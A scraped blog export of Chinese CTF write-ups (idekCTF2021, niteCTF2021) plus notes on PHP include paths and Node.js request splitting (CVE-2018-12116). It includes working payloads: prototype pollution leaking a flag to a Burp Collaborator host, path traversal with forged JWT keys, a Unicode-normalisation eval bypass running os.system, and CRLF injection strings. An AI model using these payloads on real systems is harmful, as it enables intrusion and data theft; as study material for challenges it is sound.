\u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;register.html\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if try_register(username, password): return redirect(\u0026#39;/login\u0026#39;) return render_template(\u0026#39;register.html\u0026#39;, message=\u0026#39;registration failed!\u0026#39;) @app.route(\u0026#39;/create\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def create(): if not session: return redirect(\u0026#39;/login\u0026#39;) if session[\u0026#39;username\u0026#39;] == \u0026#39;admin\u0026#39;: return \u0026#39;nah\u0026#39; if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;create.html\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: title = request.form[\u0026#39;title\u0026#39;] content = request.form[\u0026#39;content\u0026#39;] if len(title) \u0026gt;= 36 or len(content) \u0026gt;= 256: # 没有SSTI return \u0026#39;pls no\u0026#39; if create_note(title, content, session[\u0026#39;id\u0026#39;]): return render_template(\u0026#39;create.html\u0026#39;, message=\u0026#39;note successfully uploaded!\u0026#39;) return render_template(\u0026#39;create.html\u0026#39;, message=\u0026#39;you already have a note with that title!\u0026#39;) @app.route(\u0026#39;/fancy\u0026#39;) def fancify(): if not session: return redirect(\u0026#39;/login\u0026#39;) if \u0026#39;q\u0026#39; in request.args: # 不论get or post def filter(obj): return any([len(v) \u0026gt; 1 and k != \u0026#39;q\u0026#39; for k, v in request.args.items()]) # 长度不超过1 if not filter(request.args): results = find_note(request.args[\u0026#39;q\u0026#39;], session[\u0026#39;id\u0026#39;]) # 查找user的note q是title或content if results: message = \u0026#39;here is your 𝒻𝒶𝓃𝒸𝓎 note!\u0026#39; else: message = \u0026#39;no notes found!\u0026#39; return render_template(\u0026#39;fancy.html\u0026#39;, note=results, message=message) return render_template(\u0026#39;fancy.html\u0026#39;, message=\u0026#39;bad format! Your style params should not be so long!\u0026#39;) return render_template(\u0026#39;fancy.html\u0026#39;) @app.route(\u0026#39;/report\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def report(): if not session: return redirect(\u0026#39;/\u0026#39;) if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;report.html\u0026#39;) url = request.form[\u0026#39;url\u0026#39;] subprocess.Popen([\u0026#39;node\u0026#39;, \u0026#39;bot.js\u0026#39;, url], shell=False) return render_template(\u0026#39;report.html\u0026#39;, message=\u0026#39;admin visited your url!\u0026#39;) app.run(\u0026#39;0.0.0.0\u0026#39;, 1337) 除了app.py还有一个fancify.js有点东西\nfunction fancify(note) { color = (args.style || Math.floor(Math.random() * 6)).toString(); image = this.image || \u0026#39;/static/images/success.png\u0026#39;;\t// 支持传入image参数 styleElement = note.children[2]; styleElement.innerHTML = style; // i have no idea why i did this in such a scuffed way but I\u0026#39;m too lazy to change it. no this is not vulnerable note.className = `animation${color}`; img = new Image(); img.src = image note.append(img); } args = Arg.parse(location.search); noteElement = document.getElementById(\u0026#39;note\u0026#39;); if(noteElement){ fancify(noteElement); } 交互过程总体是这样的：可以输入并保存note，之后选择我们的note将其fancify之后渲染出来\nhttp://fancy-notes.chal.idek.team/fancy?q=Note+1\u0026amp;style=2 其中除了q以外的参数长度不超过1，如果没有指定image并且note存在就会出现success.png的图片，指定了的话就是对应图片\n另外还有一个经典report的bot，它以admin身份登入后写入一条含有flag的note，之后访问我们的url\n我一开始在python的SSTI部分浪费了一部分时间，想着明明没有过滤为什么不能执行命令，后来才知道考点就不在这里\n这个题其实跟[uiuCTF2021]YANA很像，也是纯client-side安全问题和char-by-char思想的运用，而更方便的是这里连回显方式都十分明确：含有指定内容的note存在则渲染success.png 不存在则不渲染，并且这个图片我们可以指定，那将其设为我们自己服务器上的图片，并char-by-char的盲注查询字符就可以得到flag的内容了，就像这样\nhttp://fancy-notes.chal.idek.team/fancy?q=idekctf{\u0026amp;image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/ 不过并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？\n肥肠的鸡贼，在fancy.html中引入了一个外部的js脚本\n\u0026lt;script src=\u0026#34;https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 而这个arg.js是存在js原型污染的洞并且有现成的POC-\u0026gt;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md\n这不就好说了？\nhttp://fancy-notes.chal.idek.team/fancy?q=idekctf{\u0026amp;__proto__[image]=x\u0026amp;__proto__[image]=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/ 之后只需要对q参数的后面char-by-char地盲注即可\n参考：wp\nsteghide-as-a-service As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.\nhttp://steghide-as-a-service.chal.idek.team/ | https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip\n跟php的不一样（一般要绕waf拿一个webshell），flask的文件上传考点一般在其他地方，比如一些tricks\u0026amp;SSTI\u0026amp;Cookie伪造这种的，这个题也不例外，是一个LFI\n先审一下代码\n# app.py from flask import Flask, request, render_template, make_response, redirect, send_file import imghdr from imghdr import tests import hashlib from util import * # https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension # there are no bugs here. just patching imghdr JPEG_MARK = b\u0026#39;\\xff\\xd8\\xff\\xdb\\x00C\\x00\\x08\\x06\\x06\u0026#39; \\ b\u0026#39;\\x07\\x06\\x05\\x08\\x07\\x07\\x07\\t\\t\\x08\\n\\x0c\\x14\\r\\x0c\\x0b\\x0b\\x0c\\x19\\x12\\x13\\x0f\u0026#39; def test_jpeg1(h, f): \u0026#34;\u0026#34;\u0026#34;JPEG data in JFIF format\u0026#34;\u0026#34;\u0026#34; if b\u0026#39;JFIF\u0026#39; in h[:23]: return \u0026#39;jpeg\u0026#39; def test_jpeg2(h, f): \u0026#34;\u0026#34;\u0026#34;JPEG with small header\u0026#34;\u0026#34;\u0026#34; if len(h) \u0026gt;= 32 and 67 == h[5] and h[:32] == JPEG_MARK: return \u0026#39;jpeg\u0026#39; def test_jpeg3(h, f): \u0026#34;\u0026#34;\u0026#34;JPEG data in JFIF or Exif format\u0026#34;\u0026#34;\u0026#34; if h[6:10] in (b\u0026#39;JFIF\u0026#39;, b\u0026#39;Exif\u0026#39;) or h[:2] == b\u0026#39;\\xff\\xd8\u0026#39;: return \u0026#39;jpeg\u0026#39; tests.append(test_jpeg1) tests.append(test_jpeg2) tests.append(test_jpeg3) def verify_jpeg(file_path): try: jpeg = Image.open(file_path) jpeg.verify() if imghdr.what(file_path) != \u0026#39;jpeg\u0026#39;: return False return True except: return False app = Flask(__name__) app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] = 2 * 1024 * 1024 @app.route(\u0026#39;/\u0026#39;) def index(): resp = make_response(render_template(\u0026#39;upload.html\u0026#39;)) if not request.cookies.get(\u0026#39;session\u0026#39;): resp.set_cookie(\u0026#39;session\u0026#39;, create_token()) return resp @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload(): if not request.cookies.get(\u0026#39;session\u0026#39;): return redirect(\u0026#39;/\u0026#39;) session = request.cookies.get(\u0026#39;session\u0026#39;) uploaded_file = request.files[\u0026#39;file\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] content = request.form[\u0026#39;content\u0026#39;] upload_name = uploaded_file.filename.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) # no traversal! output_name = os.path.join(\u0026#39;output/\u0026#39;, os.path.basename(upload_name)) image_data = uploaded_file.stream.read() image_md5 = hashlib.md5(image_data).hexdigest() image_path = f\u0026#39;uploads/{image_md5}.jpeg\u0026#39; content_path = f\u0026#34;uploads/{rand_string()}.txt\u0026#34; # write temp txt file with open(content_path, \u0026#39;w\u0026#39;) as f: f.write(content) f.close() # write temp image file with open(image_path, \u0026#39;wb\u0026#39;) as f: f.write(image_data) f.close() # verify jpeg validity if not verify_jpeg(image_path): return \u0026#39;File is not a valid JPEG!\u0026#39;, 400 # verify session before using it session = verify_token(session) if not session: return \u0026#39;Session token invalid!\u0026#39;, 400 # attempt to embed message in image try: embed_file(content_path, image_path, output_name, password) except: return \u0026#39;Embedding failed!\u0026#39;, 400 # append username to output path to prevent vulns sanitized_path = f\u0026#39;output/{upload_name}_{session[\u0026#34;username\u0026#34;]}\u0026#39; try: if not os.path.exists(sanitized_path): os.rename(output_name, sanitized_path) except: pass try: return send_file(sanitized_path) except: return \u0026#39;Something went wrong! Check your file name\u0026#39;, 400 app.run(\u0026#39;0.0.0.0\u0026#39;, 1337) # util.py from PIL import Image import random import jwt import string import os from imghdr import tests import subprocess priv_key = open(\u0026#39;keys/private.pem\u0026#39;, \u0026#39;r\u0026#39;).read() def create_token(): priv_key = open(\u0026#39;keys/private.pem\u0026#39;, \u0026#39;r\u0026#39;).read() token = jwt.encode({\u0026#34;username\u0026#34;: f\u0026#34;guest_{random.randint(1,10000)}\u0026#34;}, priv_key, algorithm=\u0026#39;RS256\u0026#39;, headers={\u0026#39;pubkey\u0026#39;: \u0026#39;public.pem\u0026#39;}) return token def verify_token(token): try: headers = jwt.get_unverified_header(token) pub_key_path = headers[\u0026#39;pubkey\u0026#39;] pub_key_path = pub_key_path.replace(\u0026#39;..\u0026#39;, \u0026#39;\u0026#39;) # no traversal! pub_key_path = os.path.join(os.getcwd(), os.path.join(\u0026#39;keys/\u0026#39;, pub_key_path)) pub_key = open(pub_key_path, \u0026#39;rb\u0026#39;).read() if b\u0026#39;BEGIN PUBLIC KEY\u0026#39; not in pub_key: return False return jwt.decode(token, pub_key, algorithms=[\u0026#39;RS256\u0026#39;, \u0026#39;HS256\u0026#39;]) except: return False def rand_string(): return \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters + string.digits) for i in range(32)) def embed_file(embed_file, cover_file, stegfile, password): cmd = subprocess.Popen([\u0026#39;steghide\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;-ef\u0026#39;, embed_file, \u0026#39;-cf\u0026#39;, cover_file, \u0026#39;-sf\u0026#39;, stegfile, \u0026#39;-p\u0026#39;, password]).wait(timeout=.5) def cleanup(): for f in os.listdir(\u0026#39;uploads/\u0026#39;): os.remove(os.path.join(\u0026#39;uploads/\u0026#39;, f)) for f in os.listdir(\u0026#39;output/\u0026#39;): os.remove(os.path.join(\u0026#39;output/\u0026#39;, f)) 页面上可以以任意的content和passwd上传一个jpg/jpeg文件，之后可以下载filename.jpg_guest_3295这样的一个文件，并且我们的jwt会更新，其中username部分就是拼在.jpg后面的内容\n康关键部分源码\n利用os.path.join()我们可以直接得到一个不受干扰的绝对路径，类似这样\n\u0026gt;\u0026gt;\u0026gt; os.path.join(\u0026#39;amiz/tmp\u0026#39;,\u0026#39;/etc/passwd\u0026#39;) \u0026#39;/etc/passwd\u0026#39; 上传的文件名是直接拼在os.path.join中的，过滤了../，我们可以使用..././的方式来绕过（过滤之后拼起来正好是../，可以做到路径穿越，不过文件名还会有一个_下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择/proc/self/map_files（选择/usr/local/lib/python3.8/http/__pycache__也是可以滴）\n验证cookie是否合法的时候是在文件上传之后的事情，所以我们可以用我们上传的文件做public.key\nimage_data = uploaded_file.stream.read() image_md5 = hashlib.md5(image_data).hexdigest() image_path = f\u0026#39;uploads/{image_md5}.jpeg\u0026#39; 我们的图片路径就在/app/uploads/{image_md5}.jpeg下，是固定可指向的（绝对路径）\n所以整个思路就是：先上传一个含有公钥的jpeg图片，之后上传一个正常的jpg图片，这次要修改文件名\n..././..././..././..././..././proc/self/map 再配合我们的jwt，其中的username部分就得是这样\nfiles/../../../app/flag.txt pubkey部分指向我们图片的绝对路径\n/app/uploads/{image_md5}.jpeg 这样，上传之后经过拼接 最终路径将会是\noutput/../../../../../proc/self/map_files/../../../app/flag.txt 这样在下载时就做到了任意文件读取，得到flag\n————肥肠巧妙的思路了！之前做jwt相关的题固定套路都是ssti获取key，伪造cookie就好了，而这个跟文件还有结合，之前没见过\n————有一个我忽略的点：由于是先保存文件再校验 所以不用管传上去报不报错都会被留存，然鹅然鹅，都有了embed_file函数来直接获得隐写的文件了。。。。😅小丑竟是我自己\n参考：wp\nMisc/Profanity Check once tried to filter messages for profanity using a discord bot. I failed. nc profanity-check.chal.idek.team 1337\nhttps://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py\n#/usr/bin/env python3 from unicodedata import normalize import random i = input(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;) for n in range(10000): if random.choice(\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;) in i: print(\u0026#34;Profanity detected. Exiting.\u0026#34;) exit(0) i = normalize(\u0026#34;NFC\u0026#34;, i) blacklist = [\u0026#34;__\u0026#34;, \u0026#34;()\u0026#34;, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;!\u0026#34;, \u0026#34;@\u0026#34;, \u0026#34;#\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;mro\u0026#34;, \u0026#34;sub\u0026#34;, \u0026#34;glob\u0026#34;] for n in blacklist: if n in i: print(\u0026#34;Profanity detected. Exiting.\u0026#34;) exit(0) eval(i) 很明显需要绕过这个waf来rce，没有被过滤的有单双引号和数字，所以我们可以用八进制，比如这样\neval(\u0026#39;\\150\\145\\154\\160\\50\\51\\40\u0026#39;) # eval(help()) 但是这里用8进制并不可以被eval执行，因为本地是这样的\n但是通过input传过去之后会被转义，再加一个反斜杠\n那肯定会想再加反斜杠呗？\n本来我们的\\反斜杠是用来做8进制的引导字符的，结果这样处理会变成纯纯的字符串，越描越黑了\n显然这样是执行不了命令的（也可能是我知道的太少了，欢迎各位师傅分享），我们这里用unicode的小trick\n做题多一点的师傅应该就能明白啥意思了，一个常考的点是注册ªdmin的账户来伪造admin，这里也是同理；代码中有一个缺陷：先过滤黑名单字符再进行normalize()，这会导致特殊的unicode字符会先顺利通过过滤，再被normalize()转为正常字符，最终命令执行\n这里是个exp\n#!/usr/bin/env python3 letters = [\u0026#39;ª\u0026#39;, \u0026#39;ᵇ\u0026#39;, \u0026#39;ᶜ\u0026#39;, \u0026#39;ᵈ\u0026#39;, \u0026#39;ᵉ\u0026#39;, \u0026#39;ᶠ\u0026#39;, \u0026#39;ᵍ\u0026#39;, \u0026#39;ʰ\u0026#39;, \u0026#39;ⁱ\u0026#39;, \u0026#39;ʲ\u0026#39;, \u0026#39;ᵏ\u0026#39;, \u0026#39;ˡ\u0026#39;, \u0026#39;ᵐ\u0026#39;, \u0026#39;ⁿ\u0026#39;, \u0026#39;º\u0026#39;, \u0026#39;ᵖ\u0026#39;, \u0026#39;ｑ\u0026#39;, \u0026#39;ʳ\u0026#39;, \u0026#39;ˢ\u0026#39;, \u0026#39;ₜ\u0026#39;, \u0026#39;ᵘ\u0026#39;, \u0026#39;ᵛ\u0026#39;, \u0026#39;ʷ\u0026#39;, \u0026#39;ˣ\u0026#39;, \u0026#39;ʸ\u0026#39;, \u0026#39;ᶻ\u0026#39;] # payload = \u0026#34;print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls\u0026#39;))\u0026#34; payload = \u0026#34;print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat flag.txt\u0026#39;))\u0026#34; exploit = \u0026#34;ᵉᵛªˡ(\u0026#39;\u0026#39;\u0026#34; for char in payload: exploit += f\u0026#34;+ᶜʰʳ({ord(char)})\u0026#34; exploit += \u0026#34;)\u0026#34; print(exploit) # ᵉᵛªˡ(\u0026#39;\u0026#39;+ᶜʰʳ(112)+ᶜʰʳ(114)+ᶜʰʳ(105)+ᶜʰʳ(110)+ᶜʰʳ(116)+ᶜʰʳ(40)+ᶜʰʳ(95)+ᶜʰʳ(95)+ᶜʰʳ(105)+ᶜʰʳ(109)+ᶜʰʳ(112)+ᶜʰʳ(111)+ᶜʰʳ(114)+ᶜʰʳ(116)+ᶜʰʳ(95)+ᶜʰʳ(95)+ᶜʰʳ(40)+ᶜʰʳ(39)+ᶜʰʳ(111)+ᶜʰʳ(115)+ᶜʰʳ(39)+ᶜʰʳ(41)+ᶜʰʳ(46)+ᶜʰʳ(115)+ᶜʰʳ(121)+ᶜʰʳ(115)+ᶜʰʳ(116)+ᶜʰʳ(101)+ᶜʰʳ(109)+ᶜʰʳ(40)+ᶜʰʳ(39)+ᶜʰʳ(99)+ᶜʰʳ(97)+ᶜʰʳ(116)+ᶜʰʳ(32)+ᶜʰʳ(102)+ᶜʰʳ(108)+ᶜʰʳ(97)+ᶜʰʳ(103)+ᶜʰʳ(46)+ᶜʰʳ(116)+ᶜʰʳ(120)+ᶜʰʳ(116)+ᶜʰʳ(39)+ᶜʰʳ(41)+ᶜʰʳ(41)) 更多的相似unicode可以参考这个网站-\u0026gt;https://www.compart.com/en/unicode\n# 这样的也可以捏 ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116) + ｃｈｒ(120) + ｃｈｒ(116)).ｒｅａｄ(115)) 参考：WAF Bypassing with Unicode Compatibility\n少了三道js的题，我的，下次一定！\n现在少2道了\n另外steghide-as-a-service这道题感谢师傅的帮助（我自己卡到一个很蠢的地方了\n最近有点摆烂，属于是春困秋乏里面的冬眠了，睡不醒的冬三月啊啊啊啊啊啊\n北京冬至的时候日出日落之间只有9个半小时不到，谁听了不想睡死过去（\n","date":"2021-12-15T21:11:49+08:00","permalink":"https://amiaaaz.github.io/2021/12/15/idekctf2021-wp/","section":"posts","tags":["wp"],"title":"idekCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"之前做题遇到后查了一下相关文章，觉得很适合出题，但是感觉不能为了考而考，也就失去了CTF的意义，所以还不如先发出来这一篇\n（别骂了 就是懒\n关于include/require(_once)() 这几个函数应该都不陌生（还应该再加上include_path），干的是文件包含的事；先按照给定参数寻找路径（当定义了路径则会完全忽略include_path），如果只有文件名则按照include_path的指定目录寻找，如果还没找到则会在调用脚本文件所在的目录和当前工作目录下寻找；下面说几个小点\n首先是require和include的区别在于require在出错时会产生E_COMPILE_ERROR级别的错误，脚本将中止运行，而include只会产生警告E_WARNING，不影响继续顶着错误继续执行脚本（做题很常见这个 无数的报错下面有正常的回显）\n另一个区别在于require是无条件包含函数，即程序执行前就会将文件内容以文本替换的形式引入（所以这份文件只被处理一次），让它变为php脚本的一部分（所以通常放在php文件的最前面）；include则是有条件包含函数，用到时才被加载，且每次执行文件时都要进行读取和评估\n当php遇到require/include(_once)函数时，如果给定的参数是个绝对路径则直接引入，但如果给的是相对路径，则要进入另外的逻辑（经过多次调用，宏展开后进入_php_stream_fopen_with_path）寻找此文件；在_php_stream_fopen_with_path会根据include_path和当前执行文件的path组成一个待选的目录列表，然后从列表头部开始根据DEFAULT_DIR_SEPARATOR（linux下默认为: win为;）取出路径，然后拼上文件名，如果成功则返回，失败则继续下一个待选择路径（所以如果有重名的就好玩了）\n几个好玩的小栗子 这里举一个小栗子，文件结构和内容如下（注意这里include_path的写法!!!不仅有path_to_subdir还有:分隔符前面代表的current_dir!!!）\n在不同的情况下运行看看效果\n在root目录下执行时，直接根据1.php的include_path寻找2.php，而2.php中并没有设置include_path，那么路径就变成了列表中第一个待选择路径 即\u0026quot;.\u0026quot;，而当前工作目录是root，所以就是/root/3.php的输出\n换到subdir目录下执行1.php时，列表中第一个待选择路径\u0026quot;.\u0026quot;变为了subdir，自然输出变为了/root/subdir/3.php的输出\n现在我们把include_path仅保留path_to_subdir，继续上面的指令运行一下\n那不管当前路径是什么都会得到subdir的输出\n再进一步，在2.php中半道清空include_path会怎么样呢\n我们发现跟上面结果一样，但是这里的逻辑却有差异：2.php中清空include_path后再包含文件将会自动变为current_path的路径，而2.php在/root/subdir下，所以回显和2.php的路径保持一致\n再再进一步\n诶，可以看到由于这里两次都用到了相对目录的\u0026quot;./\u0026quot;进行引用，所以在/root目录下运行很顺畅，而/root/subdir目录下由于不会再存在./subdir/2.php，所以报错退出\n使用注意 在使用include_path和相对路径时会影响性能，所以最好用绝对路径 目录相对路径的basedir永远是当前工作路径 可以通过__DIR__来获得绝对路径 建议少使用include/require_once *写的不全面，还有一部分需要补充 先鸽了，遇到题或者具体的应用场景我补充上来\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ 深入理解PHP之require/include顺序\n","date":"2021-12-13T01:12:22+08:00","permalink":"https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/","section":"posts","tags":["PHP","文件包含"],"title":"关于include/require(_once)的易混淆点"},{"categories":["CTF"],"contents":"http://ctf.cryptonite.team/challenges\nhttps://ctftime.org/event/1449\nWeb/welcome to niteCTF welcome baby\nGo to the https://capturetheflag.cryptonite.team and copy the flag, it\u0026rsquo;s that simple!\nf12给整了个b64，解码之后是Cryptonite，很遗憾它并不是flag\n抓包后看到有jsfuck\n\u0026lsquo;Organized by Cryptonite Manipal\u0026rsquo;\n也不是flag，就很鸡贼，在另一个js文件中\nWeb/BATCHEST My friend just opened a new zoo, so I made him a site to check if his zoo has those animals. https://blindsqli-web.chall.cryptonite.team/\nAuthor: SPEED\n把盲注的提示写到url中了\n它的回显只有有和没有两种，所以需要char-by-char类型的盲注\n不过这里要注意lion'or '1' #返回了500，而lion'or '1' -- 返回正常，说明这里的数据库是sqlite，用的是sqlite_master来获取信息\n# 脚本我之后完善一下 # 之前写了一个通用的char-by-char-sqli的模板 # 但是发现耦合性太高了 # 还是按功能分开函数写比较好 # 待完善中XD # 然后看到了一个截图 # 对哦 他妈的为什么盲注这种东西不直接用burp-intruder呢？？？？？？？ # ？？？？ # 突然发现了一个华点 # 还写个p的脚本 用burp # 开玩笑的 各有各的应用场景 Web/JWT Jason likes cookies but he is diabetic. So his mom stored them away somewhere safe. Can you help him find the path that leads to the solution for his hungry desires?\nhttps://jwt-web.challenge.cryptonite.team http://35.201.116.81/\nAuthor: LatinArceus\n我们得伪造一个\u0026quot;admin_cap\u0026quot;:\u0026quot;true\u0026quot;的cookie，注意到这里的kid指向的是服务器本地的secret.txt，那我们只需要把它指向我们自己的secret.txt就好了\nnite{R3diR3ct10n_c4n_b3_4_vuLn_t0O}\nMisc/Let\u0026rsquo;s be Artistic We have received some encoded message from an art gallery. Can you trace it back to the flag? The flag is all uppercase. Wrap it in flag format nite{}\n87yhnmkj 5rfvbnju76 5rfvbnju76 tyjnbg tyjnbg 5rfc6ygn cft6yhn efvgyjmko 9ikm xdr5thnji9 87yhnmkj 键盘打字的轨迹 （在键盘上撒把米 鸡跑的路线\nnite{GOODDRAWING}\nMisc/Slow Passwords We made ourselves super secure by a random password authentication every time the connection is established. Is it really that secure?\nnc slow-passwords.challenge.cryptonite.team 1337\n刚开始都没明白啥意思，看了wp知道了\n每次连接服务器生成不同的passwd，允许每次1个字符输3次，但是输入不同字符的响应时间是不同的，有的长有的短，我们可以找个参照字符（比如'a'），通过响应时间跟'a'所花的时间的偏移量来判断是否正确（相当于一种变相的时间盲注了），从而计算出下一个该输入的字符\nfrom pwn import * from time import time p = remote(\u0026#34;slow-passwords.challenge.cryptonite.team\u0026#34;, 1337) print(p.recvlines(5)) curr = p.recvline() print(\u0026#39;start:\u0026#39;, curr) count = 0 while count \u0026lt; 11: curr = \u0026#39;a\u0026#39; p.sendline(b\u0026#39;a\u0026#39;) print(p.recvline()) start = time() print(p.recvline()) end = time() offset = round(end - start) print(\u0026#34;offset:\u0026#34;, offset) next = bytes(chr(ord(\u0026#39;a\u0026#39;) + offset), \u0026#39;utf-8\u0026#39;) p.sendline(next) print(p.recvline()) print(p.recvline()) count += 1 p.close() 很巧妙的用法！这个故事告诉我们char-by-char类型的盲注真的是在以各种各样的形式四处开花，在很多场合都能用的上\n参考：wp\n最近刷题到buuoj第7页了，学校也到第15周的教学周了，这周还有四级，整个人，有点难顶的\n所以！我选择当一只鸵鸟，本着：车到山前必有路，船到桥头自然直的态度迎来寒假前这段时间！\n太多的flag就不立了，立心里了\n","date":"2021-12-12T23:12:52+08:00","permalink":"https://amiaaaz.github.io/2021/12/12/nitectf2021-wp/","section":"posts","tags":["wp"],"title":"niteCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"说到与HTTP请求有关的攻击方式能想到什么？\n是不是一下子恍然大明白了\n这一篇就是其中HTTP Request Splitting的学习笔记，长期更新；其它模块的也会随后更新~\n老规矩，所有的参考链接\u0026amp;docker链接放到文末\nNode.js: http请求路径中的unicode字符损坏 使用Node.js向特定路径发出http请求，但是却被定向到了不一样的路径\n虽然用户发出的http请求通常是个字符串string，但Node.js最终必须将请求以原始字节raw bytes输出，js支持unicode，这其中涉及到了unicode编码转换。对于不包含body的请求，Node.js默认使用latin1，它是单字节编码，不能表示高编号的unicode字符，比如emoji 🐶\nv = \u0026#39;/caf\\u{E9}\\u{01F436}\u0026#39; console.log(v) w = Buffer.from(v, \u0026#39;latin1\u0026#39;).toString(\u0026#39;latin1\u0026#39;) console.log(w) 两字节的unicode编码用latin1转换为单字节时会被截去开头的第一个字节\nconsole.log(Buffer.from(\u0026#39;\\u{5b}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) console.log(Buffer.from(\u0026#39;\\u{015b}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) console.log(Buffer.from(\u0026#39;\\u{0128}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) console.log(Buffer.from(\u0026#39;\\u{28}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) 那这个Node.js的安全问题跟SSRF又是怎么联系到一起的呢？处理用户输入时出现了数据损坏是个明显的危险信号\nHTTP Request Splitting This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.\n通俗来说，就是原本1个请求对应1次响应，现在我们对请求的body部分再添加1个请求，导致看似发送了1次请求实则会被解释为2个响应被加载出来，会造成XSS和SSRF\n举一个简单的小栗子：一般的请求形式是这样的\nGET /private-api?q=\u0026lt;user-input-here\u0026gt; HTTP/1.1 但是我们构造了这样的用户输入\nx HTTP/1.1\\r\\n\\r\\nDELETE /private-api HTTP/1.1\\r\\n 当请求发出后，服务端将会收到这样的请求\nGET /private-api?q=x HTTP/1.1 DELETE /private-api HTTP/1.1 包含了两个请求方式，如果服务端没有设置特殊的过滤则可能会将两个请求全部执行并回显；而如果第二个额外的请求包含一些只有服务端本地才能访问到的内容，则会造成SSRF(Server-Side Request Forgery)\nSSRF via Request Splitting / cve-2018-12116 正如上面栗子展示的那样，不过一般http库都会对这种行为做出防范；Node.js也不例外，比如\nconst http = require(\u0026#39;http\u0026#39;); http.get(\u0026#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\\r\\n/test\u0026#39;) 换成unicode呢？画风开始奇怪了\n\u0026#39;http://example.com/\\u{010D}\\u{010A}/test\u0026#39; 上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造\\r\\n了\nBuffer.from(\u0026#39;http://example.com/\\u{010D}\\u{010A}/test\u0026#39;, \u0026#39;latin1\u0026#39;).toString() 当Node.js\u0026lt;=8构造对这样的url请求时，由于他们不是HTTP控制字符所以不会修改，原样输出；而结合上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造\\r\\n的CRLFi了\n现在的Node.js均已修复此问题，官方修复-\u0026gt;http: add \u0026ndash;security-revert for CVE-2018-12116\n旧版中会直接对解释不了的unicode报错，而不是尝试原封不动的搬过去请求\n真实场景下的案例 来自-\u0026gt;Security Bugs in Practice: SSRF via Request Splitting 强烈建议看原文\n火狐邮箱账号的客户端与服务器后端交互流程是这样的\n+--------+ +--------+ +-----------+ +----------+ | Client | HTTP | API | HTTP | DataStore | SQL | MySQL | | |\u0026lt;------\u0026gt;| Server |\u0026lt;------\u0026gt;| Service |\u0026lt;-----\u0026gt;| Database | +--------+ +--------+ +-----------+ +----------+ 客户端发出的请求是通过http与API Server交互的，比如一个这样的请求\nGET /email/74657374406578616d706c652e636f6d 会得到test@example.com的邮件记录，用hex做了请求的路由，但是一个删除操作却是直接拼接字符串\nDELETE /account/xyz/emails/test@example.com 此时，最后的端点可控，结合上面的bug，当我们注册这样一个账号\nx@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc 它其实是这样\nv = \u0026#39;x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc\u0026#39; Buffer.from(v.toLowerCase(), \u0026#34;latin1\u0026#34;).toString() 